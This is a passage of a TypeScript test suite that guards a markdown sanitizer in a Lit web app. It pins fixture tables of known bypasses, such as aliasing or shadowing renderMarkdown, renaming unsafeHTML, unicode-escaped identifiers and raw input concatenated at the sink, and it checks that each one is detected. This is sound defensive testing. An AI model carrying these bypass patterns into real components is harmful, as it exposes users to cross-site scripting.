    for (const { name, pattern } of BANNED_SINKS) {
      if (!views.some(({ code }) => pattern.test(code))) {
        problems.push(
          `no positive exercises the '${name}' pattern — it is unfixtured detection logic, ` +
            'which is what this table exists to prevent. Add a fixture for it.',
        );
      }
    }
    if (problems.length > 0) {
      throw new Error(`banned sink no longer detected: ${problems.join(' | ')}`);
    }
  });

  // T4b. The two count pins are the other tree-wide checks that were live but
  // unfixtured: their only input is the real tree, which by construction always
  // carries the pinned value, so neither could ever have been exercised against
  // a wrong count. Asserting the predicates directly is the same treatment R8
  // got. Note the residual limit honestly: this catches a NEUTERED predicate,
  // not a DELETED call site. Deleting a whole `check()` is what EXPECTED_CHECKS
  // is for.
  check('fixture: the tree-wide count pins fire on a changed count', () => {
    const missed: string[] = [];
    if (sourceFileCountViolation(EXPECTED_SOURCE_FILES) !== null) {
      missed.push('the source-file pin rejects the true count');
    }
    if (sinkCountViolation(REQUIRED_SINKS.length) !== null) {
      missed.push('the sink-count pin rejects the true count');
    }
    if (requiredSinkScopeViolation(EXPECTED_REQUIRED_SINKS) !== null) {
      missed.push('the scope pin rejects the true scope');
    }
    for (const delta of [-1, 1]) {
      if (sourceFileCountViolation(EXPECTED_SOURCE_FILES + delta) === null) {
        missed.push(`the source-file pin is silent at ${EXPECTED_SOURCE_FILES + delta}`);
      }
      if (sinkCountViolation(REQUIRED_SINKS.length + delta) === null) {
        missed.push(`the sink-count pin is silent at ${REQUIRED_SINKS.length + delta}`);
      }
      // The one that matters is delta === -1: a SHRINK is the mutation the
      // derived total cannot see. Both directions are asserted anyway, because a
      // pin that only fires downward is a pin someone will "fix" by adding an
      // entry rather than by looking at what left.
      if (requiredSinkScopeViolation(EXPECTED_REQUIRED_SINKS + delta) === null) {
        missed.push(`the scope pin is silent at ${EXPECTED_REQUIRED_SINKS + delta}`);
      }
    }
    if (missed.length > 0) {
      throw new Error(`count pin no longer fires: ${missed.join(' | ')}`);
    }
  });

  // R6b's positives and false-positive controls. The rule is VACUOUS against the
  // tree — no source file here uses a dynamic import at all — so without this
  // table the tree-wide check above would pass forever without the predicate
  // ever running, which is the R8 defect exactly. The two tables are asserted in
  // one check because a bypass fixture and its false-positive mirror have to move
  // together, and this loop calls `dynamicImportSpecifierOffenders` BY NAME
  // rather than asking whether any tree-wide rule fired.
  const DYNAMIC_IMPORT_EVASIONS = [
    // The B3a capture: a split specifier reaches the same instance R8/R9 are
    // guarding, while naming no contiguous literal either can match.
    "const p = import('dompur' + 'ify');",
    'const p = import(spec);',
    'const p = import(`dompurify`);',
    'const p = import(cond ? "dompurify" : "marked");',
    "const { unsafeHTML: raw } = await import(MODULES['raw']);",
  ];

  // `import.meta` is the entry that matters here: the lookahead in
  // stripImportStatements now excludes BOTH expression forms of `import`, and
  // this pins that excluding `import(` did not also make `import.meta` start
  // matching this rule. A static import must not trip it either.
  const DYNAMIC_IMPORT_LEGITIMATE = [
    "const p = import('dompurify');",
    'const p = await import("lit");',
    "const p = await import('./helper.js');",
    "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
    'const dev = import.meta.env.DEV;',
  ];

  check('fixture: the dynamic-import specifier rule catches every unresolvable form', () => {
    const problems: string[] = [
      fixtureTableViolation('DYNAMIC_IMPORT_EVASIONS', DYNAMIC_IMPORT_EVASIONS, 5),
      fixtureTableViolation('DYNAMIC_IMPORT_LEGITIMATE', DYNAMIC_IMPORT_LEGITIMATE, 5),
    ].filter((v): v is string => v !== null);
    for (const fixture of DYNAMIC_IMPORT_EVASIONS) {
      const code = stripInertText(fixture, { strings: false });
      const found = dynamicImportSpecifierOffenders('<fixture>', code);
      if (found.length === 0) {
        problems.push(`SURVIVED: ${fixture}`);
        continue;
      }
      for (const offender of found) {
        if (!/^<fixture>:\d+: /.test(offender)) {
          problems.push(`offender has no line number: ${offender}`);
        }
      }
    }
    for (const fixture of DYNAMIC_IMPORT_LEGITIMATE) {
      const code = stripInertText(fixture, { strings: false });
      const found = dynamicImportSpecifierOffenders('<fixture>', code);
      if (found.length > 0) {
        problems.push(`FALSE POSITIVE: ${fixture} — ${found.join(' | ')}`);
      }
    }
    if (problems.length > 0) {
      throw new Error(`the dynamic-import specifier rule is broken: ${problems.join(' | ')}`);
    }
  });

  // THE LEVEL-OUT CONTROL, and the last rule in this file to get one.
  //
  // All eleven fixture tables are protected from silent shrinkage by exactly one
  // function, `fixtureTableViolation`, and until this check it was the only rule
  // here with NO POSITIVE CONTROL. Every other predicate reddens when neutered,
  // because something asserts it directly at a wrong input; this one was never
  // called with a wrong input, because its only inputs were the real tables,
  // which by construction always carry the pinned value. That is the identical
  // "a harness that cannot express an input cannot test it" defect as the arity
  // blind spot and the two count pins — one level further out again, and note
  // the docblock above the function opens by naming that very shape.
  //
  // Measured before this check existed: neutering `fixtureTableViolation` to
  // always return null was GREEN 77/122, and it stayed GREEN with ARITY_EVASIONS
  // then emptied on top of it — all eleven arity bypasses unprotected, nothing
  // fired. This is a COVERAGE HOLE, not a mis-attributed assertion: the table
  // size pins are correctly worded and do fire on their own.
  //
  // Same treatment as `fixture: the tree-wide count pins fire on a changed
  // count`, and the residue is the same: this catches a NEUTERED predicate, not
  // a DELETED call site. Deleting a whole `check()` is what EXPECTED_CHECKS is
  // for.
  check('fixture: the table-size pin fires on a changed table length', () => {
    const missed: string[] = [];
    if (fixtureTableViolation('X', [1, 2], 2) !== null) {
      missed.push('the table-size pin rejects a table of the expected length');
    }
    // Both directions. SHRINKAGE is the failure that matters — an emptied or
    // merge-truncated table makes its check pass vacuously — but a pin that only
    // fires downward is one someone "fixes" by adding an entry rather than by
    // looking at what left.
    if (fixtureTableViolation('X', [1], 2) === null) {
      missed.push('the table-size pin is silent on a SHORTENED table');
    }
    if (fixtureTableViolation('X', [], 2) === null) {
      missed.push('the table-size pin is silent on an EMPTIED table');
    }
    if (fixtureTableViolation('X', [1, 2, 3], 2) === null) {
      missed.push('the table-size pin is silent on a LENGTHENED table');
    }
    if (missed.length > 0) {
      throw new Error(`the table-size pin no longer fires: ${missed.join(' | ')}`);
    }
  });

  // The fixture is given a real path in the tree and checked against the real
  // scanned set, so R6 is exercised against the same data the production files
  // are, rather than against a hand-made stub that could drift.
  const FIXTURE_REL = 'src/components/inspector/sound-fixture.ts';

  // A minimal file that satisfies all seven rules, used as the base for the
  // mutation table below. It deliberately contains the HTML comment and the
  // security comment that used to turn the suite red.
  const SOUND_SINK_FILE = [
    "import { LitElement, html } from 'lit';",
    "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
    "import { renderMarkdown } from '../../util/markdown.js';",
    '// SECURITY: never alias unsafeHTML, and never shadow renderMarkdown.',
    'export class C extends LitElement {',
    '  render() {',
    '    return html`',
    '      <!-- renderMarkdown sanitizes with DOMPurify before this HTML is injected. -->',
    '      ${unsafeHTML(renderMarkdown(this.body))}',
    '    `;',
    '  }',
    '}',
  ].join('\n');

  check('fixture: the sink-binding rules accept a correct sink file', () => {
    const violations = sinkBindingViolations(FIXTURE_REL, SOUND_SINK_FILE, scannedRel);
    if (violations.length > 0) {
      throw new Error(`the sound fixture was rejected: ${violations.join(' | ')}`);
    }

    // The MIRROR of V10, and the half of that defect that would have got this
    // guard deleted rather than bypassed. Under the old `[^;]` import regex a
    // CORRECT sink file whose imports simply omitted their semicolons was
    // REJECTED, with a message accusing it of aliasing a directive it never
    // touched. Asserted in the same check as the sound fixture because it is the
    // same claim — the rules accept correct code — and because a bypass fixture
    // and a false-positive fixture have to move together or the next round
    // closes one by breaking the other.
    const semicolonFree = SOUND_SINK_FILE.split('\n')
      .map((line) => (line.startsWith('import ') ? line.replace(/;$/, '') : line))
      .join('\n');
    const asiViolations = sinkBindingViolations(FIXTURE_REL, semicolonFree, scannedRel);
    if (asiViolations.length > 0) {
      throw new Error(
        'a correct sink file with ASI-style imports was rejected — a guard that rejects ' +
          `correct code gets deleted: ${asiViolations.join(' | ')}`,
      );
    }
  });

  // T4b. The `opts.strings` blanking in stripInertText is genuinely protective —
  // ablate it and a sink file containing an ordinary message that NAMES the two
  // identifiers is reported as an R4 violation — but nothing in the suite
  // exercised it, because neither production sink nor SOUND_SINK_FILE contains
  // such a string. This is a FALSE-POSITIVE control, and the reason it matters
  // is line-for-line the reason the ignore-marker was defensible in the first
  // place: a guard that rejects correct code gets deleted.
  check('fixture: a string literal naming the sink identifiers is not a violation', () => {
    const withMessage = SOUND_SINK_FILE.replace(
      'export class C extends LitElement {',
      "export const MSG = 'always call renderMarkdown before unsafeHTML';\n" +
        'export class C extends LitElement {',
    );
    const violations = sinkBindingViolations(FIXTURE_REL, withMessage, scannedRel);
    if (violations.length > 0) {
      throw new Error(
        'string blanking regressed — the guard now rejects a correct sink file: ' +
          violations.join(' | '),
      );
    }
  });

  // Each entry replaces `find` with `replace` in SOUND_SINK_FILE and must yield
  // at least one violation. Every one of these was a live bypass in some round.
  const SINK_EVASIONS: { label: string; find: string; replace: string }[] = [
    {
      label: 'V1 identity shadow, sanitizer import kept under an alias',
      find: "import { renderMarkdown } from '../../util/markdown.js';",
      replace:
        "import { renderMarkdown as _rmUnused } from '../../util/markdown.js';\n" +
        'const renderMarkdown = (s: string): string => s;',
    },
    {
      label: 'V1b sanitizer import removed entirely',
      find: "import { renderMarkdown } from '../../util/markdown.js';",
      replace: 'const renderMarkdown = (s: string): string => s;',
    },
    {
      label: 'V1c sanitizer re-homed onto another module (no new file)',
      find: "import { renderMarkdown } from '../../util/markdown.js';",
      replace: "import { renderMarkdown } from '../../util/format.js';",
    },
    {
      label: 'V1d sanitizer shadowed by a parameter, not a declaration',
      find: '  render() {',
      replace: '  render(renderMarkdown: (s: string) => string) {',
    },
    {
      label: 'V1e sanitizer aliased by assignment and called under the alias',
      find: '      ${unsafeHTML(renderMarkdown(this.body))}',
      replace: '      ${unsafeHTML(rm(this.body))}',
    },
    {
      label: 'V2 unsafeHTML renamed in the import clause',
      find: "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
      replace: "import { unsafeHTML as raw } from 'lit/directives/unsafe-html.js';",
    },
    {
      label: 'V3 unsafeHTML value-aliased beside the untouched real sink',
      find: 'export class C extends LitElement {',
      replace: 'const rawHtml = unsafeHTML;\nexport class C extends LitElement {',
    },
    {
      label: 'V3b unsafeHTML in a property bag',
      find: 'export class C extends LitElement {',
      replace: 'const S = { raw: unsafeHTML };\nexport class C extends LitElement {',
    },
    {
      label: 'V3c unsafeHTML destructure-renamed off a dynamic import',
      find: 'export class C extends LitElement {',
      replace:
        "const { unsafeHTML: raw } = await import('lit/directives/unsafe-html.js');\n" +
        'export class C extends LitElement {',
    },
    {
      label: 'V3d unsafeHTML laundered through an `as` cast',
      find: 'export class C extends LitElement {',
      replace:
        'const raw = unsafeHTML as unknown as (s: string) => unknown;\n' +
        'export class C extends LitElement {',
    },
    {
      label: 'V3e unsafeHTML re-exported out of the sink file',
      find: 'export class C extends LitElement {',
      replace: 'export { unsafeHTML };\nexport class C extends LitElement {',
    },
    {
      label: 'V7 value alias hidden behind a regex literal containing an escaped //',
      find: 'export class C extends LitElement {',
      replace:
        'const proto = /^https:\\/\\//.source; const rawHtml = unsafeHTML;\n' +
        'export class C extends LitElement {',
    },
    {
      label: 'V7b value alias hidden behind a regex character class',
      find: 'export class C extends LitElement {',
      replace:
        'const sep = /[//]/.source; const rawHtml = unsafeHTML;\n' +
        'export class C extends LitElement {',
    },
    {
      label: 'V8 directive spelled with a unicode escape in the identifier',
      find: 'export class C extends LitElement {',
      replace:
        'const rawHtml = \\u0075nsafeHTML;\n' +
        'export class C extends LitElement {',
    },
    {
      label: 'V9 alias imported from a file the scan does not cover',
      find: "import { renderMarkdown } from '../../util/markdown.js';",
      replace:
        "import { renderMarkdown } from '../../util/markdown.js';\n" +
        "import { rawHtml } from './helper.test.js';",
    },
    {
      label: 'V8b escape hidden inside a second import statement',
      find: "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
      replace:
        "import { unsafeHTML } from 'lit/directives/unsafe-html.js';\n" +
        "import { \\u0075nsafeHTML as rawHtml } from 'lit/directives/unsafe-html.js';",
    },
    {
      label: 'V9b unscanned module reached by a template-literal dynamic import',
      find: 'export class C extends LitElement {',
      replace:
        'const mod = await import(`./helper.test.js`);\n' +
        'export class C extends LitElement {',
    },
    {
      label: 'V4 sanitizer wrapper dropped at the sink',
      find: '${unsafeHTML(renderMarkdown(this.body))}',
      replace: '${unsafeHTML(this.body)}',
    },
    {
      label: 'V6 raw body concatenated onto the sanitized output',
      find: '${unsafeHTML(renderMarkdown(this.body))}',
      replace: '${unsafeHTML(renderMarkdown(this.body) + this.body)}',
    },
    {
      label: 'V6b sanitizer applied to a value nobody renders',
      find: '${unsafeHTML(renderMarkdown(this.body))}',
      replace: "${unsafeHTML(renderMarkdown('') || this.body)}",
    },
    {
      label: 'V6c sanitized output wrapped in an unsanitized template literal',
      find: '${unsafeHTML(renderMarkdown(this.body))}',
      replace: '${unsafeHTML(`<div>` + renderMarkdown(this.body) + this.body)}',
    },
    {
      label: 'V5 sanitizer imported as a type only',
      find: "import { renderMarkdown } from '../../util/markdown.js';",
      replace: "import type { renderMarkdown } from '../../util/markdown.js';",
    },
    {
      // V3 again, with two semicolons deleted. Under the old `[^;]` import regex
      // the semicolon-less import swallowed forward to the NEXT `from '…';` and
      // blanked the alias with it, so the value alias "the rule that generalises"
      // was supposed to catch became invisible to R3, R4 and the tree-wide
      // non-called-position rule simultaneously. Valid TypeScript, by ASI.
      label: 'V10 value alias swept away by a semicolon-less import statement',
      find: "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
      replace:
        "import { unsafeHTML } from 'lit/directives/unsafe-html.js'\n" +
        'const rawHtml = unsafeHTML',
    },
    {
      // The arity half of T1 at the sink. Nothing is renamed, no binding is
      // added, no file is added, and the required sink literal
      // `unsafeHTML(renderMarkdown(` is still present byte-for-byte — so R1-R4,
      // R6-R9 are all blind to it by construction. R5 is the only rule that can
      // see it, and only since it started rejecting a top-level comma.
      label: 'V11 second argument passed to the sanitizer (a configuration channel)',
      find: '      ${unsafeHTML(renderMarkdown(this.body))}',
      replace: '      ${unsafeHTML(renderMarkdown(this.body, { inline: true }))}',
    },
  ];

  check('fixture: every known sink-binding evasion is caught', () => {
    const survived: string[] = [
      fixtureTableViolation('SINK_EVASIONS', SINK_EVASIONS, 24),
    ].filter((v): v is string => v !== null);
    for (const { label, find, replace } of SINK_EVASIONS) {
      const occurrences = SOUND_SINK_FILE.split(find).length - 1;
      if (occurrences !== 1) {
        survived.push(`${label}: fixture anchor matched ${occurrences} times, expected 1`);
        continue;
      }
      const mutated = SOUND_SINK_FILE.replace(find, replace);
      if (sinkBindingViolations(FIXTURE_REL, mutated, scannedRel).length === 0) {
        survived.push(label);
      }
    }
    if (survived.length > 0) {
      throw new Error(`sink-binding evasion no longer caught: ${survived.join(' | ')}`);
    }
  });

  // R8 is satisfied vacuously today — exactly one file imports each dependency,
  // so the tree-wide check above passes without ever exercising the rule. That
  // is precisely the "control passes vacuously" failure the round-4 review
  // called out, so the rule is pinned against a table instead of against the
  // tree. Every entry is a route to the same shared singleton; none of them is
  // an `addHook` spelling, because R8 does not know what addHook is.
  const OWNERSHIP_EVASIONS = [
    "import DOMPurify from 'dompurify';",
    "import 'dompurify';",
    "import * as P from 'dompurify';",
    "export { default as P } from 'dompurify';",
    "const P = await import('dompurify');",
    'const P = await import(`dompurify`);',
    "const P = require('dompurify');",
    "import purify from 'dompurify/dist/purify.es.mjs';",
    "import { Marked } from 'marked';",
    "const { marked } = await import('marked');",
  ];

  check('fixture: sanitizer ownership holds against every route to the singleton', () => {
    const missed: string[] = [
      fixtureTableViolation('OWNERSHIP_EVASIONS', OWNERSHIP_EVASIONS, 10),
    ].filter((v): v is string => v !== null);
    for (const fixture of OWNERSHIP_EVASIONS) {
      const code = stripInertText(fixture, { strings: false });
      if (sanitizerOwnershipViolations(FIXTURE_REL, code, scannedRel).length === 0) {
        missed.push(fixture);
      }
    }
    // The owner is exempt, and only the owner: the same text under its path must
    // produce nothing, or the rule is not a rule about ownership at all.
    for (const fixture of OWNERSHIP_EVASIONS) {
      const code = stripInertText(fixture, { strings: false });
      if (sanitizerOwnershipViolations(SANITIZER_OWNER, code, scannedRel).length !== 0) {
        missed.push(`OWNER REJECTED: ${fixture}`);
      }
    }
    // An unrelated file must stay clean, including one that merely says the word.
    for (const clean of [
      "import { html } from 'lit';",
      "import { renderMarkdown } from '../../util/markdown.js';",
      'const label = purifyLabel;',
      'const note = purifyTheInput;',
    ]) {
      const code = stripInertText(clean, { strings: false });
      if (sanitizerOwnershipViolations(FIXTURE_REL, code, scannedRel).length !== 0) {
        missed.push(`FALSE POSITIVE: ${clean}`);
      }
    }
    // The ignore-line marker must NOT disarm this rule.
    const marked = "import DOMPurify from 'dompurify'; // raw-sink-scan: ignore-line";
    if (sanitizerOwnershipViolations(FIXTURE_REL, stripInertText(marked, { strings: false }), scannedRel).length === 0) {
      missed.push(`OPT-OUT HONOURED: ${marked}`);
    }

    // R9: the laundering route. An unscanned file may re-export anything.
    for (const laundered of [
      "import { P } from './purify-shim.test.js';",
      "export { P } from './purify-shim.test.js';",
      "const { P } = await import('./purify-shim.test.js');",
    ]) {
      const code = stripInertText(laundered, { strings: false });
      if (sanitizerOwnershipViolations(FIXTURE_REL, code, scannedRel).length === 0) {
        missed.push(`LAUNDERED: ${laundered}`);
      }
    }
    // ...but an inert asset is not a laundering route, and must not be flagged.
    for (const asset of ["import './styles/theme.css';", "import data from './farmtable.json';"]) {
      const code = stripInertText(asset, { strings: false });
      if (sanitizerOwnershipViolations(FIXTURE_REL, code, scannedRel).length !== 0) {
        missed.push(`FALSE POSITIVE: ${asset}`);
      }
    }
    if (missed.length > 0) {
      throw new Error(`sanitizer-ownership rule broken: ${missed.join(' | ')}`);
    }
  });
}

// A check that is deleted — or that stops being reached, or whose case list is
// built by filtering through the very predicate under test — does not fail. It
// ceases to exist, and the suite still prints a green count one lower than
// before. Every mutation count this suite reports is only as trustworthy as its
// total, so the total is pinned. Update this deliberately when adding or
// removing a check; never to make a red suite go green.
//
// Only ONE number below is maintained by hand: the literal count of `check(`
// call sites, which `grep -cE '^\s+check\('` reproduces exactly. The runtime
// total is derived from it in code, because the REQUIRED_SINKS checks are
// emitted from a loop — one call site, one check per required sink — and that
// arithmetic used to be a prose comment that had to be edited in lockstep with
// two other places. Adding a third sink now costs one edit (REQUIRED_SINKS)
// instead of three, and there is no sentence left to drift.
//
// WHAT THAT DERIVATION COSTS, AND WHERE IT IS PAID. `REQUIRED_SINKS.length`
// appears on both sides — in the loop that runs the checks and in the
// expression that predicts how many ran — so it cancels, and a SHRINK of that
// array passes here with a lower total that this pin computes as correct.
// Measured: dropping a sink, escaping the directive's name and rendering the
// field raw was green at 68. The derivation is kept, because the counterfactual
// with a hard literal restored is red for the wrong reason (it fails on the
// count, not on the missing sink, and would have been "fixed" by editing the
// literal). The scope itself is pinned separately and underivably as
// EXPECTED_REQUIRED_SINKS, asserted in `sink scan actually reads the source
// tree`. That is the check to read if this one and the sink list disagree.
//
// Moved 54 -> 59 in the round-4 cleanup: five `check()` calls were added, all of
// them the `fixture:` ones in sinkBinding(). They assert the guard's own rules
// against string tables rather than against the tree, so the false-positive
// control and every historical bypass are exercised on every run instead of
// only when the tree happens to contain the shape. No behavioural check was
// removed; the two REQUIRED_SINKS checks were rewritten in place, not added to.
//
// Moved 59 -> 61 in the round-5 addendum: R8 (sanitizer ownership) is one
// tree-wide check plus one `fixture:` check. The fixture is not optional — R8
// is satisfied vacuously by the tree today, so without a table the rule would
// pass without ever being exercised, which is the same defect as the old
// static-HTML control.
//
// Moved 61 -> 69 in round 6: two behavioural attribute pins (`action`, `slot`),
// one URI-policy pin, the two `inputContract` checks (arity and non-string
// input), and three fixture checks that give the last of the unfixtured rules
// their positive halves — BANNED_SINKS, the two count pins, and string blanking.
//
// (The round-6 line above says 61 -> 69. Round-6 head `86f30bc` measures 68, so
// one of those two endpoints is wrong. It is left as written and unreconciled:
// the numbers below are re-measured from the tree at each revision and do not
// depend on it. Flagged here so the next reader does not take it for verified.)
//
// Moved 68 -> 74 in round 7 — SIX checks, not the four this line used to name,
// and against a base of 68, not 69. Both endpoints are measured with
// `git show <rev>:web/src/util/markdown.test.ts | grep -cE '^\s+check\('` at
// round-6 head `86f30bc` and round-7 head `7b4f6dd`, and the six are enumerated
// by name-diff between the same two revisions:
//   1. tripwire: no file spells an identifier with a unicode or hex escape
//      (R7 promoted out of the two sink files)
//   2. fixture: the arity pin catches every known widening ...
//   3. renderMarkdown does not use the shared marked singleton
//   4. DOM-clobbering id/name attributes stripped
//   5. dompurify declares a floor equal to the advisory line   (T-6)
//   6. sunset clause: #204 tooling absent, tokenizer subset still earns its place
// 5 and 6 are the two `dependencyPolicy()` checks, which the previous wording
// omitted entirely — which is how a line annotating 74 came to read "-> 73".
// The scope pin added in the same round is deliberately NOT a call site of its
// own; see EXPECTED_REQUIRED_SINKS.
//
// Moved 74 -> 77 in round 8, measured the same way against `7b4f6dd`:
//   1. tripwire: every dynamic import specifier is a plain quoted literal
//      (R6b promoted out of the two sink files, same move as R7 in round 7)
//   2. fixture: the dynamic-import specifier rule catches every unresolvable form
//   3. fixture: the table-size pin fires on a changed table length
//      (the positive control `fixtureTableViolation` never had)
const EXPECTED_CHECK_CALL_SITES = 77;
const EXPECTED_CHECKS = EXPECTED_CHECK_CALL_SITES + (REQUIRED_SINKS.length - 1);

// T-4. The check total above cannot see an EVISCERATED check: `checks += 1` runs
// before the body, which it must, so a body replaced by an early return keeps
// the count. Measured: revert `slot` from FORBID_ATTR and hollow out the check
// that pins it — green at 69.
//
// Counting assertions closes the specific hole, because a hollowed body stops
// running its assert* calls. The residue is stated rather than implied: this
// covers the BEHAVIOURAL checks, which are the ones built out of assert*
// helpers. The rule fixtures throw directly and are covered instead by the table
// size pins added alongside this — different mechanism, same defect.
//
// EXACT, NOT A FLOOR — but NOT for the reason previously given here, which was
// measured false. That wording said a floor "is satisfied by adding two
// assertions somewhere new and deleting two somewhere load-bearing", implying an
// exact count is not. An exact count is satisfied by precisely that manoeuvre,
// for the arithmetic reason that 122 - 2 + 2 = 122.
//
// Measured, on this tree: revert `slot` from FORBID_ATTR in markdown.ts, hollow
// the body of `slot attribute stripped` with an early return (-2 assertions),
// and add two assertions to `style attribute stripped` (+2). GREEN at 78 checks
// / 122 assertions, with `renderMarkdown('<div slot="footer">x</div>')` returning
// the slot attribute intact. Neither this pin nor the check total fires. The
// uncompensated half of the same mutation is red here at 120, which is the only
// part the old sentence got right.
//
// WHAT EXACT ACTUALLY BUYS OVER A FLOOR, stated so nobody relaxes it on the
// strength of the refutation above. Both are blind to same-size compensation.
// The difference is that a floor's slack grows monotonically and an exact
// count's does not: once the suite has grown to 140 assertions, a floor of 122
// silently absorbs the deletion of eighteen load-bearing ones, whereas an exact
// count has to be re-baselined by hand at every change, so the window in which
// shrinkage is invisible is one commit wide and the number appears in that
// commit's diff where a reviewer sees it. That is a review property, not a
// detection property, and it is the honest reason to pay the edit cost.
//
// The real detection gap — compensated shrinkage — is not closed by any total,
// and pretending otherwise is what the old paragraph did. It is closed, where it
// is closed at all, by the per-rule fixtures and the table-size pins, which
// assert against named tables rather than against a sum.
const EXPECTED_ASSERTIONS = 123;

/**
 * Two claims this file makes about `web/package.json` that nothing evaluated.
 *
 * Both are narrow on purpose, and both read the DECLARED dependency ranges, not
 * the installed artifacts. Say what that does and does not mean before reading
 * a pass here as anything: `npm ci` against a lockfile is what decides which
 * DOMPurify actually runs, and this cannot see the lockfile. It catches an edit
 * to the declared range — which is how the range would realistically be
 * loosened — and it does not catch a lockfile pinned below the range, nor a
 * `node_modules` patched in place.
 */
function dependencyPolicy(): void {
  const pkg = JSON.parse(
    readFileSync(join(findWebRoot(), 'package.json'), 'utf8'),
  ) as { dependencies?: Record<string, string>; devDependencies?: Record<string, string> };
  const deps = { ...(pkg.dependencies ?? {}), ...(pkg.devDependencies ?? {}) };

  // T-6. Round 6 logged the `^3.4.12` floor as EXPLICITLY UNCOVERED, on the
  // reasoning that it has no red-on-revert and cannot get one in this suite.
  // The first half is right and the second is not, quite: the suite cannot
  // observe a downgrade BEHAVIOURALLY, because the behavioural checks pass
  // against older DOMPurify too — but the declaration is a file this suite
  // already reads files from.
  //
  // 3.4.12 is the floor because DOMPurify's advisories through 3.2.x are
  // mXSS/namespace-confusion bypasses of exactly the sanitize() call this
  // module's security rests on, so a caret range with a lower floor silently
  // permits a vulnerable install on a fresh `npm i`.
  check('dompurify declares a floor equal to the advisory line', () => {
    const range = deps['dompurify'];
    if (range !== '^3.4.12') {
      throw new Error(
        `dompurify is declared as ${JSON.stringify(range)}, expected "^3.4.12". ` +
          'The floor is a security boundary, not a preference: releases below it carry ' +
          'known mXSS bypasses of the sanitize() call this module depends on. Raising ' +
          'the floor is fine — update this string in the same commit. Lowering or ' +
          'widening it needs a reason on the record. ' +
          'WHAT THIS DOES NOT COVER: the installed artifact. This reads package.json ' +
          'only, so a lockfile or a patched node_modules below the floor passes here.',
      );
    }
  });

  // O3. The sunset clause in the mechanism (b) note above says to delete the
  // tokenizer-dependent subset of this guard once #204 lands. As prose it fired
  // on nothing, so the realistic outcome was #204 landing and both halves being
  // maintained forever — which is the default the clause was written to prevent.
  //
  // Give it a trigger. The condition is observable: #204 is a typescript-eslint
  // rule, and it cannot be enforcing without typescript-eslint being a declared
  // dependency of this package. Deliberately the WEAKER direction — this fires
  // on the tooling appearing, not on the rule being enforced, so a human still
  // confirms the rule is on in CI before deleting anything.
  //
  // BARE `eslint` IS NOT IN THE PREDICATE, though it was until round 8. The
  // sentence above states the condition as *typescript-eslint* being declared,
  // and bare `eslint` is a style linter that cannot host a type-aware AST rule:
  // adding it for formatting would have fired a clause instructing the reader to
  // delete eight guards, and the check's own docblock would have said it does
  // not do that. A false trigger on this check is expensive — it asks for
  // deletions — so the predicate is kept narrower than the sunset condition
  // rather than wider. `typescript-eslint` (the flat-config meta package) and
  // any `@typescript-eslint/*` plugin both still fire it.
  check('sunset clause: #204 tooling absent, tokenizer subset still earns its place', () => {
    const eslintDeps = Object.keys(deps).filter(
      (d) => d.startsWith('@typescript-eslint/') || d === 'typescript-eslint',
    );
    if (eslintDeps.length > 0) {
      throw new Error(
        `typescript-eslint tooling is now declared (${eslintDeps.join(', ')}), which is the ` +
          'sunset condition in the mechanism (b) note above. THIS IS NOT A DEFECT — it is ' +
          'the clause firing as designed, and it is the only thing that will ever fire it. ' +
          'Confirm #204 is enforcing in CI, then DELETE the tokenizer-dependent subset: ' +
          'stripInertText, stripImportStatements, R3, R4, R7, directiveIndirectionOffenders, ' +
          'BANNED_SINKS and their fixture tables. Keep the behavioural half and R1/R2/R5/R6/' +
          'R8/R9. Then delete this check. ' +
          'If #204 is NOT what added this dependency, the clause has not been met: say so ' +
          'here and narrow the condition, rather than deleting the check to get to green.',
      );
    }
  });
}

function run(): void {
  formControls();
  spoofingAttributes();
  scriptExecution();
  svgSurface();
  ordinaryMarkdown();
  inputContract();
  taskLists();
  sinkBinding();
  dependencyPolicy();
  // LAST, and it must stay last: it poisons the global `marked` singleton with no
  // undo. See the section header above `sharedMarkedSingleton`.
  sharedMarkedSingleton();

  if (checks !== EXPECTED_CHECKS) {
    failures.push(
      `check total pinned: expected ${EXPECTED_CHECKS} checks to run ` +
        `(${EXPECTED_CHECK_CALL_SITES} call sites + ${REQUIRED_SINKS.length - 1} extra from the ` +
        `REQUIRED_SINKS loop), ${checks} did — a check() call site was added or silently ` +
        'removed, so update EXPECTED_CHECK_CALL_SITES after confirming which. ' +
        'NOTE WHAT THIS PIN DOES NOT COVER: a change to REQUIRED_SINKS moves both terms of ' +
        'the derivation and cannot reach this message at all — the sink list is pinned by ' +
        'EXPECTED_REQUIRED_SINKS instead, in `sink scan actually reads the source tree`. ' +
        'The previous wording here said a REQUIRED_SINKS change meant "the total moves on ' +
        'its own and nothing here needs editing", which is true and was read as reassurance; ' +
        'it is the reason a scope shrink was invisible. ' +
        'Never change either number merely to make a red suite go green.',
    );
  }

  // Reported ONLY when nothing else failed. A failing assert* throws, so the
  // rest of its check's assertions never run and the count is legitimately low —
  // reporting it alongside a real failure would add a second, misleading line to
  // every red run.
  if (failures.length === 0 && assertions !== EXPECTED_ASSERTIONS) {
    failures.push(
      `assertion total pinned: expected ${EXPECTED_ASSERTIONS} assertions to run, ${assertions} ` +
        'did. Every check() call site is still present — that is what the check total above ' +
        'measures — so this is a change INSIDE one or more check bodies. If you added or ' +
        'removed assertions deliberately, update EXPECTED_ASSERTIONS in the same commit. If ' +
        'you did not, a check body has been hollowed out: it still runs, still counts, and no ' +
        'longer asserts anything. Never change this number merely to make a red suite go green.',
    );
  }

  if (failures.length > 0) {
    throw new Error(
      `${failures.length} of ${checks} markdown sanitizer checks failed:\n` +
        failures.map((f) => `  - ${f}`).join('\n'),
    );
  }
  console.log(`markdown sanitizer: ${checks} checks passed (${assertions} assertions)`);
}

run();
